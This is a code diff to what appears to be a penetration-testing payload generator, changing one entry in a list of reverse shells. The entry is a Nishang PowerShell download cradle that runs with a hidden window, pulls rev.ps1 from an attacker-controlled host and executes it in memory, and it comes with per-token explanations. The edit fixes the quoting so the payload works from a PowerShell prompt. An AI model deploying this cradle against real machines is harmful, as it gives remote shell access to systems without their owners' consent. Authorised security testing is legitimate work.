@@ -107,12 +107,12 @@ export const REVERSE_SHELLS: PayloadDef[] = [
   {
     id: "nishang-cradle", generator: "shell", title: "Nishang cradle (served rev.ps1)", os: "windows",
     contexts: ["cmd", "powershell", "sql-string"], requires: ["powershell", "served-file"],
-    template: "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/rev.ps1')",
+    template: `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/rev.ps1')"`,
     parts: [
       { token: "powershell", explain: "Starts PowerShell." },
       { token: "-nop", explain: "-nop: no profile." },
       { token: "-w hidden", explain: "-w hidden: no visible window." },
-      { token: "-c", explain: "-c: run the following command text." },
+      { token: "-c", explain: "-c: run the following command text. Double-quoted so a PowerShell prompt passes it through instead of evaluating the (...) itself." },
       { token: "IEX(", explain: "Runs the downloaded rev.ps1 in memory." },
       { token: "rev.ps1", explain: "Your served reverse-shell script. It has LHOST and LPORT inside, so regenerate it after a VPN IP change." },
     ],
